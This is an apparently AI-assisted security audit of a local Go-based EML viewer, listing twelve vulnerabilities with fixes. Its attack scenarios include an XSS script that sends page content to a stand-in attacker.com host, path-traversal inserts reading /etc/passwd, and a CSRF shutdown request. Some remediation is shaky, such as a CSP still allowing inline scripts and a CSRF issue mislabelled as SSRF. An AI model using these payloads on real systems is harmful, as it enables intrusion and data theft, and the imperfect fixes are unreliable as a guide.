# Security Fixes Required for EML Viewer

**Date**: 2025-11-04
**Assessment Type**: Comprehensive Security Audit
**Overall Security Rating**: MEDIUM RISK (Critical fixes required)

---

## Executive Summary

This document outlines security vulnerabilities identified in the EML Viewer application. The application is designed for local use but lacks proper security controls that could be exploited if exposed to untrusted networks or when processing malicious EML files.

**Total Vulnerabilities**: 12
- **Critical**: 4
- **High**: 4
- **Medium**: 3
- **Low**: 1

---

## CRITICAL SEVERITY VULNERABILITIES

### 1. HTML Injection and XSS via Email Body Rendering

**Severity**: CRITICAL
**OWASP**: A03:2021 - Injection
**File**: `/home/felo/work/eml-viewer/web/templates/email.html:120-128`

#### Issue

The application renders HTML email content directly in an iframe using the `srcdoc` attribute without proper sanitization:

```html
<iframe
    sandbox="allow-same-origin"
    srcdoc="{{.Email.BodyHTML}}"
    class="w-full border border-gray-300 rounded"
    style="min-height: 500px"
    onload="this.style.height=(this.contentWindow.document.body.scrollHeight+20)+'px';"
></iframe>
```

#### Vulnerabilities

1. **XSS via onload handler**: The `onload` attribute accesses `contentWindow.document.body`, which combined with `allow-same-origin` sandbox permission, allows malicious HTML emails to execute JavaScript in the parent context
2. **Insufficient sandbox**: Only using `allow-same-origin` is dangerous - it should explicitly deny scripts
3. **No Content Security Policy**: No CSP headers to restrict script execution

#### Attack Scenario

```html
<!-- Malicious EML body could contain: -->
<script>
  // Access parent window due to allow-same-origin
  parent.document.cookie = "stolen=true";
  fetch('https://attacker.com/exfil?data=' + parent.document.body.innerHTML);
</script>
```

#### Remediation

**Step 1: Fix the iframe in email.html**

```html
<!-- SECURE VERSION -->
<iframe
    sandbox=""
    srcdoc="{{.Email.BodyHTML | sanitizeHTML}}"
    class="w-full border border-gray-300 rounded"
    style="min-height: 500px"
></iframe>

<!-- Remove the onload handler, use CSS instead -->
<style>
.email-iframe {
    min-height: 500px;
    height: auto;
}
</style>
```

**Step 2: Implement HTML sanitization in handlers.go**

```go
// Add to go.mod
// github.com/microcosm-cc/bluemonday v1.0.26

// In handlers.go
import "github.com/microcosm-cc/bluemonday"

func (h *Handlers) LoadTemplates(embeddedFiles embed.FS) error {
    p := bluemonday.UGCPolicy()

    tmpl := template.New("").Funcs(template.FuncMap{
        "html": func(s string) template.HTML {
            return template.HTML(s)
        },
        "sanitizeHTML": func(s string) template.HTML {
            return template.HTML(p.Sanitize(s))
        },
    })
    // ... rest of template loading
}
```

**Step 3: Add CSP headers in main.go**

```go
func securityHeadersMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; "+
            "script-src 'self' 'unsafe-inline'; "+
            "style-src 'self' 'unsafe-inline'; "+
            "img-src 'self' data:; "+
            "frame-src 'none'; "+
            "object-src 'none'; "+
            "base-uri 'self';")
        w.Header().Set("X-Content-Type-Options", "nosniff")
        w.Header().Set("X-Frame-Options", "DENY")
        w.Header().Set("X-XSS-Protection", "1; mode=block")
        next.ServeHTTP(w, r)
    })
}

// Add to router in main():
r.Use(securityHeadersMiddleware)
```

---

### 2. Path Traversal Vulnerability in File Access

**Severity**: CRITICAL
**OWASP**: A01:2021 - Broken Access Control
**Files**:
- `/home/felo/work/eml-viewer/internal/db/db.go:62-70`
- `/home/felo/work/eml-viewer/internal/db/emails.go:604-610`
- `/home/felo/work/eml-viewer/internal/db/emails.go:666-672`

#### Issue

The application resolves file paths without validating they stay within the configured emails directory:

```go
// db.go:62-70
func (db *DB) ResolveEmailPath(relativePath string) string {
    if filepath.IsAbs(relativePath) {
        // Already absolute (legacy data)
        return relativePath
    }
    // Resolve relative to configured emails path
    return filepath.Join(db.emailsPath, relativePath)
}
```

#### Vulnerabilities

1. No validation that the resolved path stays within `emailsPath`
2. Accepts absolute paths directly from database
3. No canonicalization to prevent `../` traversal
4. Attackers could insert malicious file paths into the database

#### Attack Scenario

```sql
-- Attacker inserts malicious path into database
INSERT INTO emails (file_path, ...) VALUES ('../../../../etc/passwd', ...);

-- Or using relative traversal
INSERT INTO emails (file_path, ...) VALUES ('../../../sensitive/data.txt', ...);

-- Application would then read arbitrary files when viewing email
```

#### Remediation

```go
// SECURE VERSION - Update db.go
import (
    "errors"
    "path/filepath"
    "strings"
)

var ErrPathTraversal = errors.New("path traversal detected")

func (db *DB) ResolveEmailPath(relativePath string) (string, error) {
    // Reject absolute paths
    if filepath.IsAbs(relativePath) {
        return "", ErrPathTraversal
    }

    // Clean the path to remove .. and .
    cleaned := filepath.Clean(relativePath)

    // Check for path traversal attempts
    if strings.Contains(cleaned, "..") {
        return "", ErrPathTraversal
    }

    // Resolve to absolute path
    absEmailsPath, err := filepath.Abs(db.emailsPath)
    if err != nil {
        return "", err
    }

    resolved := filepath.Join(absEmailsPath, cleaned)

    // Canonicalize both paths
    absResolved, err := filepath.Abs(resolved)
    if err != nil {
        return "", err
    }

    // Verify the resolved path is within emailsPath
    if !strings.HasPrefix(absResolved, absEmailsPath + string(filepath.Separator)) &&
       absResolved != absEmailsPath {
        return "", ErrPathTraversal
    }

    return absResolved, nil
}

// Update all callers to handle error:
// emails.go:607
absolutePath, err := db.ResolveEmailPath(email.FilePath)
if err != nil {
    return nil, fmt.Errorf("invalid file path: %w", err)
}
```

---

### 3. Infinite Loop Risk in Conversation Threading

**Severity**: CRITICAL
**OWASP**: A04:2021 - Insecure Design
**File**: `/home/felo/work/eml-viewer/internal/db/conversations.go:222-236`

#### Issue

The `findConversationRoot` function has no cycle detection. If email A replies to B, and B replies to A (corrupted data), this loops forever:

```go
func (db *DB) findConversationRoot(email *Email) (*Email, error) {
    current := email

    // Keep following in_reply_to until we find the root
    for current.InReplyTo != "" {
        parent, err := db.GetEmailsByMessageID(current.InReplyTo)
        if err != nil || parent == nil {
            break
        }
        current = parent
    }
    return current, nil
}
```

#### Attack Scenario

```
Email A (ID: msg-123) replies to Email B (ID: msg-456)
Email B (ID: msg-456) replies to Email A (ID: msg-123)
→ Infinite loop when finding conversation root
→ Application hangs, DoS
```

#### Remediation

```go
func (db *DB) findConversationRoot(email *Email) (*Email, error) {
    current := email
    visited := make(map[string]bool)
    maxHops := 100 // Reasonable limit for email threads

    for hops := 0; current.InReplyTo != "" && hops < maxHops; hops++ {
        if visited[current.MessageID] {
            return nil, fmt.Errorf("circular reference detected in email thread")
        }
        visited[current.MessageID] = true

        parent, err := db.GetEmailsByMessageID(current.InReplyTo)
        if err != nil || parent == nil {
            break
        }
        current = parent
    }
    return current, nil
}
```

---

### 4. No Authentication or Authorization

**Severity**: CRITICAL (if exposed), LOW (localhost only)
**OWASP**: A07:2021 - Identification and Authentication Failures
**File**: `/home/felo/work/eml-viewer/main.go:82-102`

#### Issue

The application has zero authentication or authorization controls. Anyone who can access the server can:
- View all emails
- Download all attachments
- Trigger system shutdown via POST `/shutdown`
- Initiate resource-intensive scans

#### Current Configuration

```go
// main.go:27 - Hardcoded to localhost
cfg := config.Default()  // Host: "localhost", Port: "8787"
```

#### Risk Assessment

- **Current Risk**: LOW (localhost-only default)
- **If Exposed Risk**: CRITICAL (no access controls whatsoever)

#### Remediation Options

**Option 1: Add Basic Authentication (Recommended for local use)**

```go
// config.go - Add authentication config
type Config struct {
    // ... existing fields
    RequireAuth bool
    AuthToken   string  // Simple bearer token
}

// middleware.go - New file
func (h *Handlers) authMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        if !h.cfg.RequireAuth {
            next.ServeHTTP(w, r)
            return
        }

        // Check for auth token
        token := r.Header.Get("Authorization")
        expectedToken := "Bearer " + h.cfg.AuthToken

        if token != expectedToken {
            w.Header().Set("WWW-Authenticate", `Bearer realm="EML Viewer"`)
            http.Error(w, "Unauthorized", http.StatusUnauthorized)
            return
        }

        next.ServeHTTP(w, r)
    })
}

// main.go - Apply middleware
r.Use(h.authMiddleware)
```

**Option 2: Enforce Localhost-Only Binding**

```go
// config.go - Add validation
func (c *Config) Validate() error {
    if c.Host != "localhost" && c.Host != "127.0.0.1" {
        return errors.New("host must be localhost or 127.0.0.1 for security")
    }
    return nil
}
```

---

## HIGH SEVERITY VULNERABILITIES

### 5. Server-Side Request Forgery (SSRF) via Shutdown Endpoint

**Severity**: HIGH
**OWASP**: A10:2021 - Server-Side Request Forgery
**File**: `/home/felo/work/eml-viewer/internal/handlers/handlers.go:56-78`

#### Issue

The POST `/shutdown` endpoint has no CSRF protection and can be triggered by any HTTP client:

```go
func (h *Handlers) Shutdown(w http.ResponseWriter, r *http.Request) {
    log.Println("Shutdown requested via web interface")
    // ... no validation
    if h.shutdownChan != nil {
        go func() {
            h.shutdownChan <- os.Interrupt
        }()
    }
}
```

#### Attack Scenario

```html
<!-- Malicious website visited by user -->
<img src="http://localhost:8787/shutdown" />
<!-- Or via fetch -->
<script>
fetch('http://localhost:8787/shutdown', {method: 'POST'});
</script>
```

#### Remediation

```go
// 1. Add CSRF token middleware
import "github.com/gorilla/csrf"

// main.go
CSRF := csrf.Protect(
    []byte("32-byte-long-secret-key-here!!"),
    csrf.Secure(false), // Set to true in production with HTTPS
    csrf.Path("/"),
)
r.Use(CSRF)

// 2. Require confirmation token
func (h *Handlers) Shutdown(w http.ResponseWriter, r *http.Request) {
    // Validate CSRF token (handled by middleware)

    // Require explicit confirmation
    confirm := r.FormValue("confirm")
    if confirm != "yes" {
        http.Error(w, "Confirmation required", http.StatusBadRequest)
        return
    }

    // Rate limit
    if !h.rateLimitShutdown() {
        http.Error(w, "Too many shutdown requests", http.StatusTooManyRequests)
        return
    }

    log.Println("Shutdown requested via web interface")
    // ... rest of shutdown logic
}
```

---

### 6. SQL Injection via FTS5 Search

**Severity**: HIGH
**OWASP**: A03:2021 - Injection
**File**: `/home/felo/work/eml-viewer/internal/db/search.go:14-20, 106-127`

#### Issue

While the application uses parameterized queries, the FTS5 query construction manually escapes special characters but may be vulnerable to injection:

```go
func escapeFTS5(term string) string {
    // Escape double quotes by doubling them
    term = strings.ReplaceAll(term, `"`, `""`)
    // Wrap in quotes to treat special chars as literals
    return `"` + term + `"`
}
```

The escaping only handles quotes, but FTS5 has special operators:
- `AND`, `OR`, `NOT`
- `NEAR()`, `*` wildcards
- Column filters like `subject:term`

#### Remediation

```go
// SECURE VERSION
import "unicode"

func escapeFTS5(term string) string {
    // Strip all non-alphanumeric except spaces and basic punctuation
    var sanitized strings.Builder
    for _, r := range term {
        if unicode.IsLetter(r) || unicode.IsNumber(r) || r == ' ' || r == '@' || r == '.' || r == '-' {
            sanitized.WriteRune(r)
        }
    }

    cleaned := sanitized.String()

    // Escape quotes
    cleaned = strings.ReplaceAll(cleaned, `"`, `""`)

    // Return quoted term
    return `"` + cleaned + `"`
}

// Add input length validation
func (db *DB) SearchEmailsWithFiltersAndOffset(query, sender, recipient string, hasAttachments bool, dateFrom, dateTo string, limit, offset int) ([]*EmailSearchResult, error) {
    // Validate input lengths
    if len(query) > 500 || len(sender) > 255 || len(recipient) > 255 {
        return nil, errors.New("search term too long")
    }

    // ... rest of function
}
```

---

### 7. Filename Injection in Attachment Downloads

**Severity**: HIGH
**OWASP**: A03:2021 - Injection
**File**: `/home/felo/work/eml-viewer/internal/handlers/attachments.go:41`

#### Issue

Attachment filenames from untrusted email sources are used directly in HTTP headers without sanitization:

```go
w.Header().Set("Content-Disposition", "attachment; filename=\""+att.Filename+"\"")
```

#### Attack Scenario

```
Malicious filename: evil.pdf"; MaliciousHeader: attack
Result header: Content-Disposition: attachment; filename="evil.pdf"; MaliciousHeader: attack"
```

This could enable:
- HTTP Response Splitting
- Header injection attacks
- CRLF injection

#### Remediation

```go
import (
    "mime"
    "net/http"
    "path/filepath"
    "strings"
)

func sanitizeFilename(filename string) string {
    // Remove path separators
    filename = filepath.Base(filename)

    // Remove any control characters and quotes
    cleaned := strings.Map(func(r rune) rune {
        if r < 32 || r == 127 || r == '"' || r == '\'' {
            return -1  // Remove character
        }
        return r
    }, filename)

    // Limit length
    if len(cleaned) > 255 {
        cleaned = cleaned[:255]
    }

    // Fallback if empty
    if cleaned == "" {
        cleaned = "download.bin"
    }

    return cleaned
}

func (h *Handlers) DownloadAttachment(w http.ResponseWriter, r *http.Request) {
    // ... existing code to get attachment ...

    // SECURE: Properly encode filename
    safeFilename := sanitizeFilename(att.Filename)
    w.Header().Set("Content-Disposition",
        mime.FormatMediaType("attachment", map[string]string{
            "filename": safeFilename,
        }))
    w.Header().Set("Content-Type", att.ContentType)
    w.Header().Set("Content-Length", strconv.FormatInt(int64(len(data)), 10))
    w.Header().Set("X-Content-Type-Options", "nosniff")

    w.Write(data)
}
```

---

### 8. Unrestricted File Upload via Email Indexing

**Severity**: HIGH
**OWASP**: A04:2021 - Insecure Design
**Files**:
- `/home/felo/work/eml-viewer/internal/scanner/scanner.go:36-75`
- `/home/felo/work/eml-viewer/internal/parser/eml.go:24-158`

#### Issue

The application recursively scans and parses all `.eml` files without:
- Size limits
- File type validation beyond extension
- Resource limits
- Malicious content scanning

#### Attack Scenarios

1. **Zip Bomb**: Compressed email with massive expanded size
2. **Billion Laughs**: XML entity expansion in email content
3. **Resource Exhaustion**: Thousands of large EML files

#### Remediation

```go
// scanner.go - Add size validation
const MaxFileSize = 50 * 1024 * 1024 // 50MB limit

func (s *Scanner) Scan() ([]string, error) {
    var emlFiles []string
    var totalSize int64
    const MaxTotalSize = 1024 * 1024 * 1024 // 1GB total

    err := filepath.Walk(absRoot, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            return fmt.Errorf("error accessing path %s: %w", path, err)
        }

        if info.IsDir() {
            return nil
        }

        if strings.ToLower(filepath.Ext(path)) == ".eml" {
            // Check individual file size
            if info.Size() > MaxFileSize {
                log.Printf("Skipping large file %s (%d bytes)", path, info.Size())
                return nil
            }

            // Check total size
            totalSize += info.Size()
            if totalSize > MaxTotalSize {
                return fmt.Errorf("total email size exceeds limit")
            }

            relPath, err := filepath.Rel(absRoot, path)
            if err != nil {
                return fmt.Errorf("failed to get relative path for %s: %w", path, err)
            }
            emlFiles = append(emlFiles, relPath)
        }

        return nil
    })

    return emlFiles, err
}

// parser.go - Add size limit
const MaxEmailSize = 50 * 1024 * 1024 // 50MB

func ParseEML(r io.Reader) (*ParsedEmail, error) {
    // Limit reader to prevent resource exhaustion
    limitedReader := io.LimitReader(r, MaxEmailSize)

    buf := new(bytes.Buffer)
    if _, err := io.Copy(buf, limitedReader); err != nil {
        return nil, fmt.Errorf("failed to read email: %w", err)
    }

    if buf.Len() >= MaxEmailSize {
        return nil, fmt.Errorf("email exceeds maximum size of %d bytes", MaxEmailSize)
    }

    // ... rest of parsing
}
```

---

## MEDIUM SEVERITY VULNERABILITIES

### 9. Missing Security Headers

**Severity**: MEDIUM
**OWASP**: A05:2021 - Security Misconfiguration
**File**: `/home/felo/work/eml-viewer/main.go:82-109`

#### Issue

The application lacks essential security headers (see Critical Issue #1 for full implementation).

---

### 10. Information Disclosure via Error Messages

**Severity**: MEDIUM
**OWASP**: A04:2021 - Insecure Design

#### Issue

Error messages expose internal paths and system information in logs.

#### Remediation

```go
// Create structured error logging
type SecurityLogger struct {
    logger *log.Logger
}

func (sl *SecurityLogger) LogSecurityError(ctx string, err error, publicMsg string) {
    // Log full details internally
    sl.logger.Printf("[SECURITY] %s: %v", ctx, err)
}

func (h *Handlers) DownloadAttachment(w http.ResponseWriter, r *http.Request) {
    // ... code ...
    data, err := h.db.GetAttachmentData(id)
    if err != nil {
        h.secLogger.LogSecurityError("attachment_download", err, "Attachment not found")
        http.Error(w, "Attachment not found", http.StatusNotFound)
        return
    }
}
```

---

### 11. Lack of Rate Limiting

**Severity**: MEDIUM
**OWASP**: A04:2021 - Insecure Design

#### Issue

No rate limiting on any endpoints, enabling:
- Brute force attacks (if auth is added)
- DoS via expensive operations (search, scan)
- Resource exhaustion

#### Remediation

```go
import "golang.org/x/time/rate"

// Rate limiter middleware
func rateLimitMiddleware(limiter *rate.Limiter) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            if !limiter.Allow() {
                http.Error(w, "Rate limit exceeded", http.StatusTooManyRequests)
                return
            }
            next.ServeHTTP(w, r)
        })
    }
}

// main.go
// Global rate limiter: 100 requests per second, burst of 200
globalLimiter := rate.NewLimiter(100, 200)
r.Use(rateLimitMiddleware(globalLimiter))

// Per-endpoint limiters for expensive operations
scanLimiter := rate.NewLimiter(1, 3) // 1/sec, burst of 3

r.Route("/scan", func(r chi.Router) {
    r.Use(rateLimitMiddleware(scanLimiter))
    r.Get("/", h.ScanPage)
    r.Post("/", h.Scan)
})
```

---

## LOW SEVERITY VULNERABILITIES

### 12. Unencrypted Database Storage

**Severity**: LOW
**OWASP**: A02:2021 - Cryptographic Failures
**File**: `/home/felo/work/eml-viewer/internal/db/db.go:18-49`

#### Issue

The SQLite database stores sensitive email metadata in plaintext.

#### Remediation Options

**Option 1: SQLite Encryption (SQLCipher)**

```go
import _ "github.com/mutecomm/go-sqlcipher/v4"

func Open(dbPath string) (*DB, error) {
    key := os.Getenv("DB_ENCRYPTION_KEY")
    if key == "" {
        return nil, errors.New("DB_ENCRYPTION_KEY environment variable required")
    }

    dsn := dbPath + "?_key=" + key + "&_time_format=sqlite"
    sqlDB, err := sql.Open("sqlite3", dsn)
    // ...
}
```

**Option 2: Secure file permissions**

```go
func Open(dbPath string) (*DB, error) {
    dir := filepath.Dir(dbPath)
    if err := os.MkdirAll(dir, 0700); err != nil { // Only owner can access
        return nil, fmt.Errorf("failed to create database directory: %w", err)
    }

    // ... existing code ...

    // Set restrictive permissions on database file
    if err := os.Chmod(dbPath, 0600); err != nil {
        log.Printf("Warning: Could not set database file permissions: %v", err)
    }

    return db, nil
}
```

---

## SECURITY TESTING CHECKLIST

### Immediate Actions (Critical/High)
- [ ] Fix HTML XSS vulnerability in email.html iframe
- [ ] Implement path traversal protection in ResolveEmailPath
- [ ] Add cycle detection to findConversationRoot
- [ ] Add CSRF protection to shutdown endpoint
- [ ] Sanitize FTS5 search input
- [ ] Sanitize attachment filenames
- [ ] Implement file size limits in parser and scanner
- [ ] Add security headers middleware

### Short-term Actions (Medium)
- [ ] Implement rate limiting
- [ ] Add structured security logging
- [ ] Improve error message handling
- [ ] Consider authentication for non-localhost deployments

### Long-term Actions (Low)
- [ ] Consider database encryption
- [ ] Document security model and trust boundaries
- [ ] Set up automated vulnerability scanning
- [ ] Add security unit tests

---

## PRIORITY MATRIX

| Issue | Severity | Effort | Priority | ETA |
|-------|----------|--------|----------|-----|
| #1 XSS in email rendering | Critical | Medium | 1 | 4-6 hours |
| #2 Path traversal | Critical | Low | 1 | 2-3 hours |
| #3 Infinite loop | Critical | Low | 1 | 1-2 hours |
| #4 No authentication | Critical* | Medium | 2 | 3-4 hours |
| #5 CSRF on shutdown | High | Low | 2 | 1-2 hours |
| #6 FTS5 injection | High | Low | 2 | 1-2 hours |
| #7 Filename injection | High | Low | 2 | 1-2 hours |
| #8 File size limits | High | Medium | 2 | 2-3 hours |
| #9 Security headers | Medium | Low | 3 | 1 hour |
| #10 Error disclosure | Medium | Low | 3 | 2 hours |
| #11 Rate limiting | Medium | Medium | 3 | 3-4 hours |
| #12 DB encryption | Low | High | 4 | 6-8 hours |

*Critical only if exposed beyond localhost

---

## ESTIMATED REMEDIATION TIME

- **Critical issues**: 8-16 hours
- **High issues**: 8-12 hours
- **Medium issues**: 4-8 hours
- **Total**: 20-36 hours of development work

---

## ADDITIONAL RECOMMENDATIONS

### 1. Dependency Vulnerabilities

Run regular security scans:

```bash
# Install govulncheck
go install golang.org/x/vuln/cmd/govulncheck@latest

# Scan for known vulnerabilities
govulncheck ./...
```

### 2. Security Testing

Add security-focused unit tests:

```go
func TestPathTraversal(t *testing.T) {
    db := setupTestDB(t)
    defer cleanupTestDB(t, db)

    maliciousPaths := []string{
        "../../../etc/passwd",
        "../../sensitive/data.txt",
        "/etc/shadow",
    }

    for _, path := range maliciousPaths {
        _, err := db.ResolveEmailPath(path)
        assert.Error(t, err, "Path traversal should be blocked: %s", path)
        assert.ErrorIs(t, err, ErrPathTraversal)
    }
}
```

### 3. Security Documentation

Create a `SECURITY.md` file documenting:
- Security model
- Trust boundaries
- Reporting vulnerabilities
- Security best practices for users

---

## CONCLUSION

The EML Viewer application has several critical security vulnerabilities that must be addressed before it can be safely used, especially if exposed beyond localhost. The most critical issues are:

1. **HTML/XSS injection** in email rendering
2. **Path traversal** in file access
3. **Lack of input sanitization** across multiple endpoints

The application's design as a local-only tool reduces some risks, but malicious EML files could still exploit these vulnerabilities to access sensitive files or execute arbitrary code.

**Priority**: Implement all CRITICAL and HIGH severity fixes immediately. The MEDIUM severity issues should be addressed before any public release or if the tool will process untrusted email files.

---

**Document Version**: 1.0
**Last Updated**: 2025-11-04
**Next Review**: After implementing critical fixes
